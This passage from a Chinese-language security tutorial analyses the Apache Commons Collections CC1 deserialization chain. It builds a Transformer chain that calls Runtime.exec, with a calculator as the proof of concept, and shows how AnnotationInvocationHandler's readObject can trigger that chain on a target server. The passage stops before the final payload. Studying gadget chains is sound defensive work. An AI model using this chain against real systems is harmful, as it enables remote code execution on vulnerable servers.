<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 包装之前，需要一个原生的Map。</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="comment">// 获得一个包装后的map</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span>  TransformedMap.decorate(map, </span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;,</span><br><span class="line">v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 对包装的map调用put函数时将触发上边2个回调函数。</span></span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;Transformed-key=Transformed-val&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>我们向transformedMap里put一对键值<code>key=val</code>，打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640.png" alt="图片"></p>
<p>这里我们存入的是<code>key=val</code>，但因为是包装的map所以在调用put之后触发了回调函数，也就是decorate传入的第二个参数和第三个参数，在回调函数中我在原先的k和v上加了<code>Transformed-</code>，所以最终打印的结果为<code>Transformed-key=Transformed-val</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112236399.png" alt="图片"></p>
<p>除了上边说到的put会触发之外呢，还有另外一种情况也会触发回调函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">map.put(<span class="string">&quot;value&quot;</span>, <span class="string">&quot;123&quot;</span>);</span><br><span class="line"><span class="type">TransformedMap</span> <span class="variable">transformedMap</span> <span class="operator">=</span> (TransformedMap) TransformedMap.decorate(map,</span><br><span class="line">k -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + k;</span><br><span class="line">&#125;, v -&gt; &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformed-&quot;</span> + v;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="comment">// 获取一个用户map遍历的迭代器</span></span><br><span class="line"><span class="type">Iterator</span> <span class="variable">iterator</span> <span class="operator">=</span> transformedMap.entrySet().iterator();</span><br><span class="line"><span class="comment">// 使用迭代器进行遍历</span></span><br><span class="line"><span class="keyword">while</span> (iterator.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">entry</span> <span class="operator">=</span> (Map.Entry) iterator.next();</span><br><span class="line">    <span class="comment">// 设置value为123，这里在调用时会触发回调函数。</span></span><br><span class="line">    entry.setValue(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// &#123;value=Transformed-123&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>运行后的结果是<code>&#123;value=Transformed-123&#125;</code>，就是也触发了回调函数，但是只修改了键值对中的值，也就是键值对的键没有修改，所以获取迭代器后进行<code>setValue</code>时会触发<code>decorate</code>的第三个参数位置的回调函数。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112303112.png" alt="图片"></p>
<h2 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h2><p>Transformer是一个接口，上边TransformedMap.decorate第二个参数和第三个参数需要接收的类型就是这个接口类型。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112311866.png" alt="图片"></p>
<p>我在介绍TransformedMap时用的是Java8的lambda来简化传参数的写法</p>
<p>java8写法: <code>k -&gt; &#123;...&#125;, v -&gt; &#123;...&#125;</code></p>
<p>Transformer这个接口只有一个函数需要实现，函数名为<code>transform()</code>，它有一个参数input，这个input其实就是put时对应的<code>key111</code>和<code>val111</code>，第一个Transformr对应的是map的键的处理，第二个对应的是值的处理。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112337591.png" alt="图片"></p>
<p>所以Transformer的<code>transform()</code>函数实际上就是你要对键或值的处理逻辑。</p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>ConstantTransformer是Transformer的一个实现类，这个是CommonCollections组件内已经实现好的一个类。</p>
<p>我们主要来看看它的transform函数的实现逻辑: <code>org.apache.commons.collections.functors.ConstantTransformer#transform</code></p>
<p>它的逻辑很简单，就直接返回iConstant这个成员属性。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112348008.png" alt="图片"></p>
<p>这个iConstant是什么呢？我们来看看ConstantTransformer的构造函数，构造函数接收一个constantToReturn然后就直接赋值给iConstant。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112356667.png" alt="图片"></p>
<p>那么这个类其实它的作用就是，在构造函数上传什么给它，对应的transform函数就返回什么。那么这里就起来很诡异，这有什么用？其实这个不用太多去纠结，可能在某些业务场景会用到吧！</p>
<p>我们来写一段代码，这里我们定义了2个ConstantTransformer然后分别在构造函数上传递参数<code>123</code>和<code>456</code>。在向<code>transformedMap</code>里<code>put</code>key111<code>和</code>val111&#96;</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">        map,</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;123&quot;</span>),</span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(<span class="string">&quot;456&quot;</span>)</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key111&quot;</span>, <span class="string">&quot;val111&quot;</span>);</span><br><span class="line"><span class="comment">// &#123;123=456&#125;</span></span><br><span class="line">System.out.println(transformedMap);</span><br></pre></td></tr></table></figure>

<p>打印的结果为<code>123=456</code>，前边已经说过<code>ConstantTransformer</code>就是你在构造函数上传什么，它的处理函数<code>transform()</code>就返回什么，所以在我们<code>put</code>后触发回调函数<code>ConstantTransformer#transform</code>，处理后的结果就是<code>123=456</code>。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>InvokerTransformer也是Transformer接口的一个实现类，它也是CommonCollections组件内已经实现好的一个类。</p>
<p>通过这个InvokerTransformer我们可以来实现函数的调用，先看一下InvokerTransformer的<code>transform()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">  <span class="comment">// 检验是否为空</span></span><br><span class="line">  <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// 获取input这个实例的 类类型</span></span><br><span class="line">    <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">    <span class="comment">// 根据iMethodName来获取input这个类里的函数</span></span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">    <span class="comment">// 通过反射调用这个函数</span></span><br><span class="line">    <span class="keyword">return</span> method.invoke(input, iArgs);   </span><br><span class="line">  &#125; </span><br><span class="line">  <span class="comment">// 异常捕获，我删减了！</span></span><br><span class="line">  ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>InvokerTransformer的<code>transform()</code>会根据<code>iMethodName</code>来调用input这个实例对应类里的函数，那么我们继续看一下这个<code>iMethodName</code>是哪来的。</p>
<p>在InvokerTransformer的构造函数里就有接收这个参数，并赋值给成员属性<code>iMethodName</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112434683.png" alt="图片"></p>
<p>那么我们来自定义一个类，然后通过InvokerTransformer来调用自定义类里的函数。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">print</span><span class="params">(String msg)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Print &quot;</span> + msg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Test</span> <span class="variable">test</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">  <span class="comment">// Test类中的函数名</span></span><br><span class="line">  <span class="string">&quot;print&quot;</span>,</span><br><span class="line">  <span class="comment">// 参数类型，因为InvokerTransformer构造接收的是数组，所以这里就传递数组</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">  <span class="comment">// 参数值</span></span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;hello&quot;</span>&#125; </span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  invokerTransformer,</span><br><span class="line">  invokerTransformer</span><br><span class="line">);</span><br><span class="line"><span class="comment">// put元素，TransformedMap将触发InvokerTransformer的transform函数</span></span><br><span class="line">transformedMap.put(test, test);</span><br></pre></td></tr></table></figure>

<p>打印了两次，因为<code>key</code>一次<code>value</code>一次。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112503616.png" alt="图片"></p>
<h2 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h2><p>ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串在⼀起。</p>
<p>通俗来说就是前⼀个Transformer执行的返回结果，作为后⼀个Transformer的参数传⼊。</p>
<p>同样我们来看一下它的<code>transform()</code>函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">    <span class="comment">// 循环遍历这个数组，调用元素的transform函数，并将object作为参数传入。</span></span><br><span class="line">    object = iTransformers[i].transform(object);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么我们再来看一下iTransformers是哪来的，在ChainedTransformer的构造函数里直接就接收了一个<code>Transformer数组</code>，然后赋值给<code>iTransformer</code>。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112527192.png" alt="图片"></p>
<p>来定义两个Transformer接口的实现类，并通过ChainedTransformer将它们串起来</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer1</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Transformer1&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Transformer2</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="meta">@Override</span></span><br><span class="line">  <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> input + <span class="string">&quot;-Transformer2&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>第一个Transformer的transform函数接收到的input是最外层map在put时传入的值。</p>
<p>第二个Transformer的transform函数的参数是第一个Transformer的transform函数的返回值。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer1</span>(),</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">Transformer2</span>()</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(</span><br><span class="line">  <span class="keyword">new</span> <span class="title class_">HashMap</span>(),</span><br><span class="line">  chainedTransformer,</span><br><span class="line">  chainedTransformer</span><br><span class="line">);</span><br><span class="line">transformedMap.put(<span class="string">&quot;key&quot;</span>, <span class="string">&quot;val&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// &#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</span></span><br><span class="line">System.out.println(outerMap);</span><br></pre></td></tr></table></figure>

<p>结果为<code>&#123;Transformer1-Transformer2=Transformer1-Transformer2&#125;</code></p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112605383.png" alt="图片"></p>
<p>从执行的结果能看出ChainedTransformer的作用，其实就是按顺序执行<code>Transformer#transform</code>，然后已最后那个<code>Transformer#transform</code>处理的结果为准，返回处理的结果，就像流水线一样每个环节就是一个Transformer然后拼接到一起整合成一个成品。</p>
<h2 id><a href="#" class="headerlink" title></a></h2><h2 id="将Transformer串起来执行"><a href="#将Transformer串起来执行" class="headerlink" title="将Transformer串起来执行"></a>将Transformer串起来执行</h2><ol>
<li><p>ConstantTransformer返回一个Runtime</p>
</li>
<li><p>InvokerTransformer通过反射调用上一个Transformer的返回值也就是Runtime，调用它的exec函数，弹出计算器。</p>
</li>
<li><p>使用ChainedTransformer，存入上边2个Transformer，这样才能串起来。</p>
</li>
<li><p>获取TransformedMap，调用put函数，触发transform回调。</p>
</li>
<li><p>弹出计算器</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">        <span class="comment">// ConstantTransformer构造函数传什么，在transform函数就返回什么！</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 上边的ConstantTransformer返回的是一个Runtime对象，那么我们这里通过InvokerTransformer来调用Runtime的exec函数，进行命令执行。</span></span><br><span class="line">        <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;</span><br><span class="line">        )</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 构造一个ChainedTransformer，将上边的ConstantTransformer和InvokerTransformer串联起来执行。</span></span><br><span class="line"><span class="type">Transformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">transformedMap</span> <span class="operator">=</span> TransformedMap.decorate(<span class="keyword">new</span> <span class="title class_">HashMap</span>(), <span class="literal">null</span>, chainedTransformer);</span><br><span class="line">transformedMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br></pre></td></tr></table></figure>

<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112725078.png" alt="图片"></p>
<h1 id="疑问"><a href="#疑问" class="headerlink" title="疑问"></a>疑问</h1><p>这里存在一个问题，想要在实战中能触发rce，将构造的Payload数据流发送过去后，目标服务端调用readObject进行反序列化还原对象，&#x3D;&#x3D;将TransformedMap还原后还需要进行一次put动作才能触发transform函数来达到rce效果。&#x3D;&#x3D;</p>
<p>但是很遗憾目前我们构造的这些，它只是一个本地的demo，因为发送到目标服务器后它并不会主动进行一次put动作(当然也有可能代码会在readObject后调用一次put，看运气！)。</p>
<p>那么如果我们在Java中能找到满足以下条件的类，就能进行RCE。</p>
<ol>
<li>类支持序列化操作</li>
<li>重写了readObject函数，并且在readObject函数中调用了我们传入的TransformedMap，并做了put的动作来触发transform函数。</li>
<li>同时又要确保目标服务器上也存在该类，所以最好是JavaJdk中的类。</li>
</ol>
<h1 id="AnnotationInvocationHandler"><a href="#AnnotationInvocationHandler" class="headerlink" title="AnnotationInvocationHandler"></a>AnnotationInvocationHandler</h1><p>那么在Java中有一个类<code>sun.reflect.annotation.AnnotationInvocationHandler</code>，这个是属于Java原生库里的类，不需要额外引入依赖。</p>
<p>来看一下这个类的readObject函数</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream var1)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">  var1.defaultReadObject();</span><br><span class="line">  <span class="type">AnnotationType</span> <span class="variable">var2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    var2 = AnnotationType.getInstance(<span class="built_in">this</span>.type);</span><br><span class="line">  &#125; <span class="keyword">catch</span> (IllegalArgumentException var9) &#123;</span><br><span class="line">    <span class="comment">// 异常抛出，被我删了，简化阅读。</span></span><br><span class="line">    ......</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">Map</span> <span class="variable">var3</span> <span class="operator">=</span> var2.memberTypes();</span><br><span class="line">  <span class="type">Iterator</span> <span class="variable">var4</span> <span class="operator">=</span> <span class="built_in">this</span>.memberValues.entrySet().iterator();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>(var4.hasNext()) &#123;</span><br><span class="line">    Map.<span class="type">Entry</span> <span class="variable">var5</span> <span class="operator">=</span> (Map.Entry)var4.next();</span><br><span class="line">    <span class="type">String</span> <span class="variable">var6</span> <span class="operator">=</span> (String)var5.getKey();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">var7</span> <span class="operator">=</span> (Class)var3.get(var6);</span><br><span class="line">    <span class="keyword">if</span> (var7 != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">Object</span> <span class="variable">var8</span> <span class="operator">=</span> var5.getValue();</span><br><span class="line">      <span class="keyword">if</span> (!var7.isInstance(var8) &amp;&amp; !(var8 <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">        <span class="comment">// 注意看这里，这里有一个setValue的动作，实际上我们回想前边TransformedMap的回调函数触发机制，是不是也说明过setValue能触发decorate()的第三个参数的回调函数。</span></span><br><span class="line">        var5.setValue(...).setMember(...);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在代码中我们可以注意到有调用setValue，在最开始介绍TransformedMap时就说过，除了put函数外呢，通过迭代器后调用setValue动作也会触发transform()函数的执行。</p>
<p><code>var5.setValue(...).setMember(......);</code></p>
<p>那么我们只要能将这个var5设为我们自定义的那个TransformedMap对应的迭代器，就可以进行rce。</p>
<p>那么我们先来分析一下var5是哪来的。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112802836.png" alt="图片"></p>
<p>var5来自var4的<code>next()</code>函数，继续跟进看看var4，var4来自memberValues，并且这里是调用了<code>iterator()</code>获取一个迭代器，所以memberValues肯定是一个集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112812567.png" alt="图片"></p>
<p>memberValues是在AnnotationInvocationHandler的构造函数传进来的一个map集合。</p>
<p><img src="/images/Java%E5%AE%89%E5%85%A8-CC1%E9%93%BETransformedMap%E5%88%86%E6%9E%90/640-20221021112822961.png" alt="图片"></p>
<p>那么我们只要构造一个AnnotationInvocationHandler，然后将带有rce调用链的TransformedMap传入AnnotationInvocationHandler的构造函数，这样就能将memberValues赋值为带有恶意攻击的TransformedMap。</p>
<p>然后我们将AnnotationInvocationHandler进行序列化，发送到目标服务器，当目标服务器在反序列化调用readObjet时，就会调用AnnotationInvocationHandler里的readObject，而恰好这个readObject内又调用了memberValues迭代器的setValue函数，那么他就会触发transform函数进行利用链的指向。</p>
<p>有了思路后，我们就来实例化AnnotationInvocationHandler这个类，但是这个类的构造函数是私有的，所以我们这里需要通过Java的反射才能获取到这个类的实例。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">construct</span> <span class="operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line"><span class="comment">// 设置这一行才能访问私有的</span></span><br><span class="line">construct.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="comment">// 这里的transformedMap就是我们最开始分析的那个</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">expObj</span> <span class="operator">=</span> construct.newInstance(Retention.class, transformedMap);</span><br></pre></td></tr></table></figure>

<p>这里我们注意到构造函数上还传了一个<code>Retention.class</code>的东西，我们回到AnnotationInvocationHandler的构造函数逻辑来看一下。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">AnnotationInvocationHandler(Class&lt;? <span class="keyword">extends</span> <span class="title class_">Annotation</span>&gt; var1, Map&lt;String, Object&gt; var2) &#123;</span><br><span class="line">  Class[] var3 = var1.getInterfaces();</span><br><span class="line">  <span class="comment">// 这里要求var1必须是一个注解，同时接口长度只能为1，并且要求第一个接口为Annotation</span></span><br><span class="line">  <span class="keyword">if</span> (var1.isAnnotation() &amp;&amp; var3.length == <span class="number">1</span> &amp;&amp; var3[<span class="number">0</span>] == Annotation.class) &#123;</span><br><span class="line">    <span class="comment">// 满足条件后会存入this.type这个成员属性里</span></span><br><span class="line">    <span class="built_in">this</span>.type = var1;</span><br><span class="line">    <span class="built_in">this</span>.memberValues = var2;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">AnnotationFormatError</span>(<span class="string">&quot;Attempt to create proxy for a non-annotation type.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其实那个if就是在校验var1是不是一个注解，当然这里的逻辑实际上随便传一个符合这个条件的注解就可以了。这样我们就能构造一个AnnotationInvocationHandler的实例了。</p>
<p>但是别急，我们回到AnnotationInvocationHandler的readObject函数，来分析一下var7，这个前边没有讲到。</p>
